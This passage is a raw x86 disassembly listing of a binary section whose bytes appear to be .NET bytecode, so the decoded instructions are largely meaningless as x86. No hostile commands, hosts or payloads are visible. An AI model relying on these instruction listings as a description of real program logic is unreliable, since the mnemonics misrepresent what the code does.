  404c05:	00 1f                	add    %bl,(%edi)
  404c07:	00 6a 89             	add    %ch,-0x77(%edx)
  404c0a:	00 0a                	add    %cl,(%edx)
	...
  404c14:	93                   	xchg   %eax,%ebx
  404c15:	93                   	xchg   %eax,%ebx
  404c16:	00 0a                	add    %cl,(%edx)
  404c18:	01 00                	add    %eax,(%eax)
  404c1a:	00 01                	add    %al,(%ecx)
  404c1c:	13 30                	adc    (%eax),%esi
  404c1e:	02 00                	add    (%eax),%al
  404c20:	2f                   	das
  404c21:	00 00                	add    %al,(%eax)
  404c23:	00 22                	add    %ah,(%edx)
  404c25:	00 00                	add    %al,(%eax)
  404c27:	11 28                	adc    %ebp,(%eax)
  404c29:	da 00                	fiaddl (%eax)
  404c2b:	00 0a                	add    %cl,(%edx)
  404c2d:	0a 16                	or     (%esi),%dl
  404c2f:	0b 2b                	or     (%ebx),%ebp
  404c31:	1d 06 07 9a 0c       	sbb    $0xc9a0706,%eax
  404c36:	08 6f db             	or     %ch,-0x25(%edi)
  404c39:	00 00                	add    %al,(%eax)
  404c3b:	0a 02                	or     (%edx),%al
  404c3d:	6f                   	outsl  %ds:(%esi),(%dx)
  404c3e:	dc 00                	faddl  (%eax)
  404c40:	00 0a                	add    %cl,(%edx)
  404c42:	28 dd                	sub    %bl,%ch
  404c44:	00 00                	add    %al,(%eax)
  404c46:	0a 2c 02             	or     (%edx,%eax,1),%ch
  404c49:	08 2a                	or     %ch,(%edx)
  404c4b:	07                   	pop    %es
  404c4c:	17                   	pop    %ss
  404c4d:	58                   	pop    %eax
  404c4e:	0b 07                	or     (%edi),%eax
  404c50:	06                   	push   %es
  404c51:	8e 69 32             	mov    0x32(%ecx),%gs
  404c54:	dd 14 2a             	fstl   (%edx,%ebp,1)
  404c57:	00 1b                	add    %bl,(%ebx)
  404c59:	30 01                	xor    %al,(%ecx)
  404c5b:	00 11                	add    %dl,(%ecx)
  404c5d:	00 00                	add    %al,(%eax)
  404c5f:	00 00                	add    %al,(%eax)
  404c61:	00 00                	add    %al,(%eax)
  404c63:	00 20                	add    %ah,(%eax)
  404c65:	03 00                	add    (%eax),%eax
  404c67:	00 80 28 85 00 00    	add    %al,0x8528(%eax)
  404c6d:	06                   	push   %es
  404c6e:	26 de 03             	fiadds %es:(%ebx)
  404c71:	26 de 00             	fiadds %es:(%eax)
  404c74:	2a 00                	sub    (%eax),%al
  404c76:	00 00                	add    %al,(%eax)
  404c78:	01 10                	add    %edx,(%eax)
  404c7a:	00 00                	add    %al,(%eax)
  404c7c:	00 00                	add    %al,(%eax)
  404c7e:	00 00                	add    %al,(%eax)
  404c80:	0d 0d 00 03 01       	or     $0x103000d,%eax
  404c85:	00 00                	add    %al,(%eax)
  404c87:	01 13                	add    %edx,(%ebx)
  404c89:	30 03                	xor    %al,(%ebx)
  404c8b:	00 14 00             	add    %dl,(%eax,%eax,1)
  404c8e:	00 00                	add    %al,(%eax)
  404c90:	02 00                	add    (%eax),%al
  404c92:	00 11                	add    %dl,(%ecx)
  404c94:	16                   	push   %ss
  404c95:	7e 08                	jle    0x404c9f
  404c97:	00 00                	add    %al,(%eax)
  404c99:	04 12                	add    $0x12,%al
  404c9b:	00 73 de             	add    %dh,-0x22(%ebx)
  404c9e:	00 00                	add    %al,(%eax)
  404ca0:	0a 80 39 00 00 04    	or     0x4000039(%eax),%al
  404ca6:	06                   	push   %es
  404ca7:	2a 1b                	sub    (%ebx),%bl
  404ca9:	30 03                	xor    %al,(%ebx)
  404cab:	00 24 00             	add    %ah,(%eax,%eax,1)
  404cae:	00 00                	add    %al,(%eax)
  404cb0:	00 00                	add    %al,(%eax)
  404cb2:	00 00                	add    %al,(%eax)
  404cb4:	14 fe                	adc    $0xfe,%al
  404cb6:	06                   	push   %es
  404cb7:	89 00                	mov    %eax,(%eax)
  404cb9:	00 06                	add    %al,(%esi)
  404cbb:	73 e0                	jae    0x404c9d
  404cbd:	00 00                	add    %al,(%eax)
  404cbf:	0a 28                	or     (%eax),%ch
  404cc1:	e1 00                	loope  0x404cc3
  404cc3:	00 0a                	add    %cl,(%edx)
  404cc5:	28 e2                	sub    %ah,%dl
  404cc7:	00 00                	add    %al,(%eax)
  404cc9:	0a 17                	or     (%edi),%dl
  404ccb:	16                   	push   %ss
  404ccc:	16                   	push   %ss
  404ccd:	28 8c 00 00 06 de 03 	sub    %cl,0x3de0600(%eax,%eax,1)
  404cd4:	26 de 00             	fiadds %es:(%eax)
  404cd7:	2a 01                	sub    (%ecx),%al
  404cd9:	10 00                	adc    %al,(%eax)
  404cdb:	00 00                	add    %al,(%eax)
  404cdd:	00 00                	add    %al,(%eax)
  404cdf:	00 20                	add    %ah,(%eax)
  404ce1:	20 00                	and    %al,(%eax)
  404ce3:	03 01                	add    (%ecx),%eax
  404ce5:	00 00                	add    %al,(%eax)
  404ce7:	01 1b                	add    %ebx,(%ebx)
  404ce9:	30 03                	xor    %al,(%ebx)
  404ceb:	00 18                	add    %bl,(%eax)
  404ced:	00 00                	add    %al,(%eax)
  404cef:	00 00                	add    %al,(%eax)
  404cf1:	00 00                	add    %al,(%eax)
  404cf3:	00 16                	add    %dl,(%esi)
  404cf5:	16                   	push   %ss
  404cf6:	16                   	push   %ss
  404cf7:	28 8c 00 00 06 de 0d 	sub    %cl,0xdde0600(%eax,%eax,1)
  404cfe:	26 20 a0 86 01 00 28 	and    %ah,%es:0x28000186(%eax)
  404d05:	14 00                	adc    $0x0,%al
  404d07:	00 0a                	add    %cl,(%edx)
  404d09:	2b f4                	sub    %esp,%esi
  404d0b:	2a 01                	sub    (%ecx),%al
  404d0d:	10 00                	adc    %al,(%eax)
  404d0f:	00 00                	add    %al,(%eax)
  404d11:	00 00                	add    %al,(%eax)
  404d13:	00 0a                	add    %cl,(%edx)
  404d15:	0a 00                	or     (%eax),%al
  404d17:	0d 01 00 00 01       	or     $0x1000001,%eax
  404d1c:	1b 30                	sbb    (%eax),%esi
  404d1e:	04 00                	add    $0x0,%al
  404d20:	38 00                	cmp    %al,(%eax)
  404d22:	00 00                	add    %al,(%eax)
  404d24:	23 00                	and    (%eax),%eax
  404d26:	00 11                	add    %dl,(%ecx)
  404d28:	7e 99                	jle    0x404cc3
  404d2a:	00 00                	add    %al,(%eax)
  404d2c:	0a 7e 3a             	or     0x3a(%esi),%bh
  404d2f:	00 00                	add    %al,(%eax)
  404d31:	04 18                	add    $0x18,%al
  404d33:	6f                   	outsl  %ds:(%esi),(%dx)
  404d34:	e3 00                	jecxz  0x404d36
  404d36:	00 0a                	add    %cl,(%edx)
  404d38:	0a 06                	or     (%esi),%al
  404d3a:	02 03                	add    (%ebx),%al
  404d3c:	18 6f e4             	sbb    %ch,-0x1c(%edi)
  404d3f:	00 00                	add    %al,(%eax)
  404d41:	0a 17                	or     (%edi),%dl
  404d43:	0b de                	or     %esi,%ebx
  404d45:	18 06                	sbb    %al,(%esi)
  404d47:	2c 06                	sub    $0x6,%al
  404d49:	06                   	push   %es
  404d4a:	6f                   	outsl  %ds:(%esi),(%dx)
  404d4b:	33 00                	xor    (%eax),%eax
  404d4d:	00 0a                	add    %cl,(%edx)
  404d4f:	dc 6f e5             	fsubrl -0x1b(%edi)
  404d52:	00 00                	add    %al,(%eax)
  404d54:	0a 28                	or     (%eax),%ch
  404d56:	95                   	xchg   %eax,%ebp
  404d57:	00 00                	add    %al,(%eax)
  404d59:	06                   	push   %es
  404d5a:	de 00                	fiadds (%eax)
  404d5c:	16                   	push   %ss
  404d5d:	2a 07                	sub    (%edi),%al
  404d5f:	2a 01                	sub    (%ecx),%al
  404d61:	1c 00                	sbb    $0x0,%al
  404d63:	00 02                	add    %al,(%edx)
  404d65:	00 11                	add    %dl,(%ecx)
  404d67:	00 0d 1e 00 0a 00    	add    %cl,0xa001e
  404d6d:	00 00                	add    %al,(%eax)
  404d6f:	00 00                	add    %al,(%eax)
  404d71:	00 00                	add    %al,(%eax)
  404d73:	00 28                	add    %ch,(%eax)
  404d75:	28 00                	sub    %al,(%eax)
  404d77:	0c 32                	or     $0x32,%al
  404d79:	00 00                	add    %al,(%eax)
  404d7b:	01 1b                	add    %ebx,(%ebx)
  404d7d:	30 02                	xor    %al,(%edx)
  404d7f:	00 39                	add    %bh,(%ecx)
  404d81:	00 00                	add    %al,(%eax)
  404d83:	00 24 00             	add    %ah,(%eax,%eax,1)
  404d86:	00 11                	add    %dl,(%ecx)
  404d88:	7e 99                	jle    0x404d23
  404d8a:	00 00                	add    %al,(%eax)
  404d8c:	0a 7e 3a             	or     0x3a(%esi),%bh
  404d8f:	00 00                	add    %al,(%eax)
  404d91:	04 6f                	add    $0x6f,%al
  404d93:	e6 00                	out    %al,$0x0
  404d95:	00 0a                	add    %cl,(%edx)
  404d97:	0a 06                	or     (%esi),%al
  404d99:	02 6f e7             	add    -0x19(%edi),%ch
  404d9c:	00 00                	add    %al,(%eax)
  404d9e:	0a 74 39 00          	or     0x0(%ecx,%edi,1),%dh
  404da2:	00 01                	add    %al,(%ecx)
  404da4:	0b de                	or     %esi,%ebx
  404da6:	18 06                	sbb    %al,(%esi)
  404da8:	2c 06                	sub    $0x6,%al
  404daa:	06                   	push   %es
  404dab:	6f                   	outsl  %ds:(%esi),(%dx)
  404dac:	33 00                	xor    (%eax),%eax
  404dae:	00 0a                	add    %cl,(%edx)
  404db0:	dc 6f e5             	fsubrl -0x1b(%edi)
  404db3:	00 00                	add    %al,(%eax)
  404db5:	0a 28                	or     (%eax),%ch
  404db7:	95                   	xchg   %eax,%ebp
  404db8:	00 00                	add    %al,(%eax)
  404dba:	06                   	push   %es
  404dbb:	de 00                	fiadds (%eax)
  404dbd:	14 2a                	adc    $0x2a,%al
  404dbf:	07                   	pop    %es
  404dc0:	2a 00                	sub    (%eax),%al
  404dc2:	00 00                	add    %al,(%eax)
  404dc4:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  404dc7:	00 02                	add    %al,(%edx)
  404dc9:	00 10                	add    %dl,(%eax)
  404dcb:	00 0f                	add    %cl,(%edi)
  404dcd:	1f                   	pop    %ds
  404dce:	00 0a                	add    %cl,(%edx)
	...
  404dd8:	29 29                	sub    %ebp,(%ecx)
  404dda:	00 0c 32             	add    %cl,(%edx,%esi,1)
  404ddd:	00 00                	add    %al,(%eax)
  404ddf:	01 1b                	add    %ebx,(%ebx)
  404de1:	30 02                	xor    %al,(%edx)
  404de3:	00 35 00 00 00 23    	add    %dh,0x23000000
  404de9:	00 00                	add    %al,(%eax)
  404deb:	11 7e 99             	adc    %edi,-0x67(%esi)
  404dee:	00 00                	add    %al,(%eax)
  404df0:	0a 7e 3a             	or     0x3a(%esi),%bh
  404df3:	00 00                	add    %al,(%eax)
  404df5:	04 6f                	add    $0x6f,%al
  404df7:	e6 00                	out    %al,$0x0
  404df9:	00 0a                	add    %cl,(%edx)
  404dfb:	0a 06                	or     (%esi),%al
  404dfd:	02 6f e8             	add    -0x18(%edi),%ch
  404e00:	00 00                	add    %al,(%eax)
  404e02:	0a 17                	or     (%edi),%dl
  404e04:	0b de                	or     %esi,%ebx
  404e06:	18 06                	sbb    %al,(%esi)
  404e08:	2c 06                	sub    $0x6,%al
  404e0a:	06                   	push   %es
  404e0b:	6f                   	outsl  %ds:(%esi),(%dx)
  404e0c:	33 00                	xor    (%eax),%eax
  404e0e:	00 0a                	add    %cl,(%edx)
  404e10:	dc 6f e5             	fsubrl -0x1b(%edi)
  404e13:	00 00                	add    %al,(%eax)
  404e15:	0a 28                	or     (%eax),%ch
  404e17:	95                   	xchg   %eax,%ebp
  404e18:	00 00                	add    %al,(%eax)
  404e1a:	06                   	push   %es
  404e1b:	de 00                	fiadds (%eax)
  404e1d:	16                   	push   %ss
  404e1e:	2a 07                	sub    (%edi),%al
  404e20:	2a 00                	sub    (%eax),%al
  404e22:	00 00                	add    %al,(%eax)
  404e24:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  404e27:	00 02                	add    %al,(%edx)
  404e29:	00 10                	add    %dl,(%eax)
  404e2b:	00 0b                	add    %cl,(%ebx)
  404e2d:	1b 00                	sbb    (%eax),%eax
  404e2f:	0a 00                	or     (%eax),%al
  404e31:	00 00                	add    %al,(%eax)
  404e33:	00 00                	add    %al,(%eax)
  404e35:	00 00                	add    %al,(%eax)
  404e37:	00 25 25 00 0c 32    	add    %ah,0x320c0025
  404e3d:	00 00                	add    %al,(%eax)
  404e3f:	01 1b                	add    %ebx,(%ebx)
  404e41:	30 03                	xor    %al,(%ebx)
  404e43:	00 3a                	add    %bh,(%edx)
  404e45:	00 00                	add    %al,(%eax)
  404e47:	00 23                	add    %ah,(%ebx)
  404e49:	00 00                	add    %al,(%eax)
  404e4b:	11 7e 99             	adc    %edi,-0x67(%esi)
  404e4e:	00 00                	add    %al,(%eax)
  404e50:	0a 72 ed             	or     -0x13(%edx),%dh
  404e53:	20 00                	and    %al,(%eax)
  404e55:	70 17                	jo     0x404e6e
  404e57:	6f                   	outsl  %ds:(%esi),(%dx)
  404e58:	e9 00 00 0a 0a       	jmp    0xa4a4e5d
  404e5d:	06                   	push   %es
  404e5e:	7e 3a                	jle    0x404e9a
  404e60:	00 00                	add    %al,(%eax)
  404e62:	04 6f                	add    $0x6f,%al
  404e64:	ea 00 00 0a 17 0b de 	ljmp   $0xde0b,$0x170a0000
  404e6b:	18 06                	sbb    %al,(%esi)
  404e6d:	2c 06                	sub    $0x6,%al
  404e6f:	06                   	push   %es
  404e70:	6f                   	outsl  %ds:(%esi),(%dx)
  404e71:	33 00                	xor    (%eax),%eax
  404e73:	00 0a                	add    %cl,(%edx)
  404e75:	dc 6f e5             	fsubrl -0x1b(%edi)
  404e78:	00 00                	add    %al,(%eax)
  404e7a:	0a 28                	or     (%eax),%ch
  404e7c:	95                   	xchg   %eax,%ebp
  404e7d:	00 00                	add    %al,(%eax)
  404e7f:	06                   	push   %es
  404e80:	de 00                	fiadds (%eax)
  404e82:	16                   	push   %ss
  404e83:	2a 07                	sub    (%edi),%al
  404e85:	2a 00                	sub    (%eax),%al
  404e87:	00 01                	add    %al,(%ecx)
  404e89:	1c 00                	sbb    $0x0,%al
  404e8b:	00 02                	add    %al,(%edx)
  404e8d:	00 11                	add    %dl,(%ecx)
  404e8f:	00 0f                	add    %cl,(%edi)
  404e91:	20 00                	and    %al,(%eax)
  404e93:	0a 00                	or     (%eax),%al
  404e95:	00 00                	add    %al,(%eax)
  404e97:	00 00                	add    %al,(%eax)
  404e99:	00 00                	add    %al,(%eax)
  404e9b:	00 2a                	add    %ch,(%edx)
  404e9d:	2a 00                	sub    (%eax),%al
  404e9f:	0c 32                	or     $0x32,%al
  404ea1:	00 00                	add    %al,(%eax)
  404ea3:	01 1b                	add    %ebx,(%ebx)
  404ea5:	30 04 00             	xor    %al,(%eax,%eax,1)
  404ea8:	c4 01                	les    (%ecx),%eax
  404eaa:	00 00                	add    %al,(%eax)
  404eac:	25 00 00 11 73       	and    $0x73110000,%eax
  404eb1:	62 00                	bound  %eax,(%eax)
  404eb3:	00 06                	add    %al,(%esi)
  404eb5:	0a 06                	or     (%esi),%al
  404eb7:	02 74 03 00          	add    0x0(%ebx,%eax,1),%dh
  404ebb:	00 1b                	add    %bl,(%ebx)
  404ebd:	6f                   	outsl  %ds:(%esi),(%dx)
  404ebe:	54                   	push   %esp
  404ebf:	00 00                	add    %al,(%eax)
  404ec1:	06                   	push   %es
  404ec2:	06                   	push   %es
  404ec3:	72 01                	jb     0x404ec6
  404ec5:	21 00                	and    %eax,(%eax)
  404ec7:	70 6f                	jo     0x404f38
  404ec9:	4d                   	dec    %ebp
  404eca:	00 00                	add    %al,(%eax)
  404ecc:	06                   	push   %es
  404ecd:	6f                   	outsl  %ds:(%esi),(%dx)
  404ece:	59                   	pop    %ecx
  404ecf:	00 00                	add    %al,(%eax)
  404ed1:	06                   	push   %es
  404ed2:	0b 07                	or     (%edi),%eax
  404ed4:	39 8c 01 00 00 07 72 	cmp    %ecx,0x72070000(%ecx,%eax,1)
  404edb:	97                   	xchg   %eax,%edi
  404edc:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  404ee0:	27                   	daa
  404ee1:	00 00                	add    %al,(%eax)
  404ee3:	0a 2d 22 07 72 a1    	or     0xa1720722,%ch
  404ee9:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  404eed:	27                   	daa
  404eee:	00 00                	add    %al,(%eax)
  404ef0:	0a 2d 56 07 72 af    	or     0xaf720756,%ch
  404ef6:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  404efa:	27                   	daa
  404efb:	00 00                	add    %al,(%eax)
  404efd:	0a 3a                	or     (%edx),%bh
  404eff:	cb                   	lret
  404f00:	00 00                	add    %al,(%eax)
  404f02:	00 38                	add    %bh,(%eax)
  404f04:	5d                   	pop    %ebp
  404f05:	01 00                	add    %eax,(%eax)
  404f07:	00 28                	add    %ch,(%eax)
  404f09:	17                   	pop    %ss
  404f0a:	00 00                	add    %al,(%eax)
  404f0c:	06                   	push   %es
  404f0d:	0c 73                	or     $0x73,%al
  404f0f:	62 00                	bound  %eax,(%eax)
  404f11:	00 06                	add    %al,(%esi)
  404f13:	25 72 01 21 00       	and    $0x210172,%eax
  404f18:	70 6f                	jo     0x404f89
  404f1a:	4d                   	dec    %ebp
  404f1b:	00 00                	add    %al,(%eax)
  404f1d:	06                   	push   %es
  404f1e:	72 97                	jb     0x404eb7
  404f20:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404f24:	4f                   	dec    %edi
  404f25:	00 00                	add    %al,(%eax)
  404f27:	06                   	push   %es
  404f28:	25 72 19 21 00       	and    $0x211972,%eax
  404f2d:	70 6f                	jo     0x404f9e
  404f2f:	4d                   	dec    %ebp
  404f30:	00 00                	add    %al,(%eax)
  404f32:	06                   	push   %es
  404f33:	08 6a 6f             	or     %ch,0x6f(%edx)
  404f36:	42                   	inc    %edx
  404f37:	00 00                	add    %al,(%eax)
  404f39:	06                   	push   %es
  404f3a:	6f                   	outsl  %ds:(%esi),(%dx)
  404f3b:	57                   	push   %edi
  404f3c:	00 00                	add    %al,(%eax)
  404f3e:	06                   	push   %es
  404f3f:	28 1e                	sub    %bl,(%esi)
  404f41:	00 00                	add    %al,(%eax)
  404f43:	06                   	push   %es
  404f44:	38 1c 01             	cmp    %bl,(%ecx,%eax,1)
  404f47:	00 00                	add    %al,(%eax)
  404f49:	00 06                	add    %al,(%esi)
  404f4b:	28 93 00 00 06 dd    	sub    %dl,-0x22fa0000(%ebx)
  404f51:	10 01                	adc    %al,(%ecx)
  404f53:	00 00                	add    %al,(%eax)
  404f55:	0d 06 72 c5 26       	or     $0x26c57206,%eax
  404f5a:	00 70 6f             	add    %dh,0x6f(%eax)
  404f5d:	4d                   	dec    %ebp
  404f5e:	00 00                	add    %al,(%eax)
  404f60:	06                   	push   %es
  404f61:	6f                   	outsl  %ds:(%esi),(%dx)
  404f62:	59                   	pop    %ecx
  404f63:	00 00                	add    %al,(%eax)
  404f65:	06                   	push   %es
  404f66:	28 8e 00 00 06 2d    	sub    %cl,0x2d060000(%esi)
  404f6c:	51                   	push   %ecx
  404f6d:	7e 3b                	jle    0x404faa
  404f6f:	00 00                	add    %al,(%eax)
  404f71:	04 06                	add    $0x6,%al
  404f73:	6f                   	outsl  %ds:(%esi),(%dx)
  404f74:	5d                   	pop    %ebp
  404f75:	00 00                	add    %al,(%eax)
  404f77:	0a 73 62             	or     0x62(%ebx),%dh
  404f7a:	00 00                	add    %al,(%eax)
  404f7c:	06                   	push   %es
  404f7d:	25 72 01 21 00       	and    $0x210172,%eax
  404f82:	70 6f                	jo     0x404ff3
  404f84:	4d                   	dec    %ebp
  404f85:	00 00                	add    %al,(%eax)
  404f87:	06                   	push   %es
  404f88:	72 cd                	jb     0x404f57
  404f8a:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404f8e:	4f                   	dec    %edi
  404f8f:	00 00                	add    %al,(%eax)
  404f91:	06                   	push   %es
  404f92:	25 72 e3 26 00       	and    $0x26e372,%eax
  404f97:	70 6f                	jo     0x405008
  404f99:	4d                   	dec    %ebp
  404f9a:	00 00                	add    %al,(%eax)
  404f9c:	06                   	push   %es
  404f9d:	06                   	push   %es
  404f9e:	72 c5                	jb     0x404f65
  404fa0:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404fa4:	4d                   	dec    %ebp
  404fa5:	00 00                	add    %al,(%eax)
  404fa7:	06                   	push   %es
  404fa8:	6f                   	outsl  %ds:(%esi),(%dx)
  404fa9:	59                   	pop    %ecx
  404faa:	00 00                	add    %al,(%eax)
  404fac:	06                   	push   %es
  404fad:	6f                   	outsl  %ds:(%esi),(%dx)
  404fae:	4f                   	dec    %edi
  404faf:	00 00                	add    %al,(%eax)
  404fb1:	06                   	push   %es
  404fb2:	6f                   	outsl  %ds:(%esi),(%dx)
  404fb3:	57                   	push   %edi
  404fb4:	00 00                	add    %al,(%eax)
  404fb6:	06                   	push   %es
  404fb7:	28 1e                	sub    %bl,(%esi)
  404fb9:	00 00                	add    %al,(%eax)
  404fbb:	06                   	push   %es
  404fbc:	2b 0b                	sub    (%ebx),%ecx
  404fbe:	09 6f e5             	or     %ebp,-0x1b(%edi)
  404fc1:	00 00                	add    %al,(%eax)
  404fc3:	0a 28                	or     (%eax),%ch
  404fc5:	95                   	xchg   %eax,%ebp
  404fc6:	00 00                	add    %al,(%eax)
  404fc8:	06                   	push   %es
  404fc9:	dd 97 00 00 00 06    	fstl   0x6000000(%edi)
  404fcf:	72 f1                	jb     0x404fc2
  404fd1:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404fd5:	4d                   	dec    %ebp
  404fd6:	00 00                	add    %al,(%eax)
  404fd8:	06                   	push   %es
  404fd9:	6f                   	outsl  %ds:(%esi),(%dx)
  404fda:	59                   	pop    %ecx
  404fdb:	00 00                	add    %al,(%eax)
  404fdd:	06                   	push   %es
  404fde:	06                   	push   %es
  404fdf:	72 c5                	jb     0x404fa6
  404fe1:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404fe5:	4d                   	dec    %ebp
  404fe6:	00 00                	add    %al,(%eax)
  404fe8:	06                   	push   %es
  404fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  404fea:	59                   	pop    %ecx
  404feb:	00 00                	add    %al,(%eax)
  404fed:	06                   	push   %es
  404fee:	28 8d 00 00 06 26    	sub    %cl,0x26060000(%ebp)
  404ff4:	7e 3b                	jle    0x405031
  404ff6:	00 00                	add    %al,(%eax)
  404ff8:	04 28                	add    $0x28,%al
  404ffa:	03 00                	add    (%eax),%eax
  404ffc:	00 2b                	add    %ch,(%ebx)
  404ffe:	6f                   	outsl  %ds:(%esi),(%dx)
  404fff:	5e                   	pop    %esi
  405000:	00 00                	add    %al,(%eax)
  405002:	0a 13                	or     (%ebx),%dl
  405004:	04 2b                	add    $0x2b,%al
  405006:	45                   	inc    %ebp
  405007:	12 04 28             	adc    (%eax,%ebp,1),%al
  40500a:	5f                   	pop    %edi
  40500b:	00 00                	add    %al,(%eax)
  40500d:	0a 13                	or     (%ebx),%dl
  40500f:	05 11 05 72 c5       	add    $0xc5720511,%eax
  405014:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  405018:	4d                   	dec    %ebp
  405019:	00 00                	add    %al,(%eax)
  40501b:	06                   	push   %es
  40501c:	6f                   	outsl  %ds:(%esi),(%dx)
  40501d:	59                   	pop    %ecx
  40501e:	00 00                	add    %al,(%eax)
  405020:	06                   	push   %es
  405021:	06                   	push   %es
  405022:	72 f1                	jb     0x405015
  405024:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  405028:	4d                   	dec    %ebp
  405029:	00 00                	add    %al,(%eax)
  40502b:	06                   	push   %es
  40502c:	6f                   	outsl  %ds:(%esi),(%dx)
  40502d:	59                   	pop    %ecx
  40502e:	00 00                	add    %al,(%eax)
  405030:	06                   	push   %es
  405031:	28 27                	sub    %ah,(%edi)
  405033:	00 00                	add    %al,(%eax)
  405035:	0a 2c 14             	or     (%esp,%edx,1),%ch
  405038:	11 05 28 93 00 00    	adc    %eax,0x9328
  40503e:	06                   	push   %es
  40503f:	7e 3b                	jle    0x40507c
  405041:	00 00                	add    %al,(%eax)
  405043:	04 11                	add    $0x11,%al
  405045:	05 6f ec 00 00       	add    $0xec6f,%eax
  40504a:	0a 26                	or     (%esi),%ah
  40504c:	12 04 28             	adc    (%eax,%ebp,1),%al
  40504f:	61                   	popa
  405050:	00 00                	add    %al,(%eax)
  405052:	0a 2d b2 de 0e 12    	or     0x120edeb2,%ch
  405058:	04 fe                	add    $0xfe,%al
  40505a:	16                   	push   %ss
  40505b:	02 00                	add    (%eax),%al
  40505d:	00 1b                	add    %bl,(%ebx)
  40505f:	6f                   	outsl  %ds:(%esi),(%dx)
  405060:	33 00                	xor    (%eax),%eax
  405062:	00 0a                	add    %cl,(%edx)
  405064:	dc de                	(bad)
  405066:	0c 6f                	or     $0x6f,%al
  405068:	e5 00                	in     $0x0,%eax
  40506a:	00 0a                	add    %cl,(%edx)
  40506c:	28 95 00 00 06 de    	sub    %dl,-0x21fa0000(%ebp)
  405072:	00 2a                	add    %ch,(%edx)
  405074:	41                   	inc    %ecx
  405075:	4c                   	dec    %esp
  405076:	00 00                	add    %al,(%eax)
  405078:	00 00                	add    %al,(%eax)
  40507a:	00 00                	add    %al,(%eax)
  40507c:	9a 00 00 00 0b 00 00 	lcall  $0x0,$0xb000000
  405083:	00 a5 00 00 00 79    	add    %ah,0x79000000(%ebp)
  405089:	00 00                	add    %al,(%eax)
  40508b:	00 32                	add    %dh,(%edx)
  40508d:	00 00                	add    %al,(%eax)
  40508f:	01 02                	add    %eax,(%edx)
  405091:	00 00                	add    %al,(%eax)
  405093:	00 55 01             	add    %dl,0x1(%ebp)
  405096:	00 00                	add    %al,(%eax)
  405098:	52                   	push   %edx
  405099:	00 00                	add    %al,(%eax)
  40509b:	00 a7 01 00 00 0e    	add    %ah,0xe000001(%edi)
	...
  4050ad:	00 00                	add    %al,(%eax)
  4050af:	00 b7 01 00 00 b7    	add    %dh,-0x48ffffff(%edi)
  4050b5:	01 00                	add    %eax,(%eax)
  4050b7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4050ba:	00 00                	add    %al,(%eax)
  4050bc:	32 00                	xor    (%eax),%al
  4050be:	00 01                	add    %al,(%ecx)
  4050c0:	13 30                	adc    (%eax),%esi
  4050c2:	0b 00                	or     (%eax),%eax
  4050c4:	1b 01                	sbb    (%ecx),%eax
  4050c6:	00 00                	add    %al,(%eax)
  4050c8:	26 00 00             	add    %al,%es:(%eax)
  4050cb:	11 28                	adc    %ebp,(%eax)
  4050cd:	ed                   	in     (%dx),%eax
  4050ce:	00 00                	add    %al,(%eax)
  4050d0:	0a 02                	or     (%edx),%al
  4050d2:	72 c5                	jb     0x405099
  4050d4:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4050d8:	4d                   	dec    %ebp
  4050d9:	00 00                	add    %al,(%eax)
  4050db:	06                   	push   %es
  4050dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4050dd:	59                   	pop    %ecx
  4050de:	00 00                	add    %al,(%eax)
  4050e0:	06                   	push   %es
  4050e1:	28 8e 00 00 06 28    	sub    %cl,0x28060000(%esi)
  4050e7:	9a 00 00 0a 28 1c 00 	lcall  $0x1c,$0x280a0000
  4050ee:	00 0a                	add    %cl,(%edx)
  4050f0:	28 a0 00 00 06 6f    	sub    %ah,0x6f060000(%eax)
  4050f6:	ee                   	out    %al,(%dx)
  4050f7:	00 00                	add    %al,(%eax)
  4050f9:	0a 72 fb             	or     -0x5(%edx),%dh
  4050fc:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  405100:	ef                   	out    %eax,(%dx)
  405101:	00 00                	add    %al,(%eax)
  405103:	0a 28                	or     (%eax),%ch
  405105:	f0 00 00             	lock add %al,(%eax)
  405108:	0a 0a                	or     (%edx),%cl
  40510a:	7e 3c                	jle    0x405148
  40510c:	00 00                	add    %al,(%eax)
  40510e:	04 3a                	add    $0x3a,%al
  405110:	85 00                	test   %eax,(%eax)
  405112:	00 00                	add    %al,(%eax)
  405114:	20 00                	and    %al,(%eax)
  405116:	01 00                	add    %eax,(%eax)
  405118:	00 72 17             	add    %dh,0x17(%edx)
  40511b:	27                   	daa
  40511c:	00 70 14             	add    %dh,0x14(%eax)
  40511f:	d0 16                	rclb   $1,(%esi)
  405121:	00 00                	add    %al,(%eax)
  405123:	02 28                	add    (%eax),%ch
  405125:	f1                   	int1
  405126:	00 00                	add    %al,(%eax)
  405128:	0a 1f                	or     (%edi),%bl
  40512a:	09 8d 86 00 00 01    	or     %ecx,0x1000086(%ebp)
  405130:	25 16 16 14 28       	and    $0x28141616,%eax
  405135:	f2 00 00             	repnz add %al,(%eax)
  405138:	0a a2 25 17 17 14    	or     0x14171725(%edx),%ah
  40513e:	28 f2                	sub    %dh,%dl
  405140:	00 00                	add    %al,(%eax)
  405142:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  405148:	28 f2                	sub    %dh,%dl
  40514a:	00 00                	add    %al,(%eax)
  40514c:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  405152:	28 f2                	sub    %dh,%dl
  405154:	00 00                	add    %al,(%eax)
  405156:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  40515c:	28 f2                	sub    %dh,%dl
  40515e:	00 00                	add    %al,(%eax)
  405160:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  405166:	28 f2                	sub    %dh,%dl
  405168:	00 00                	add    %al,(%eax)
  40516a:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  405170:	28 f2                	sub    %dh,%dl
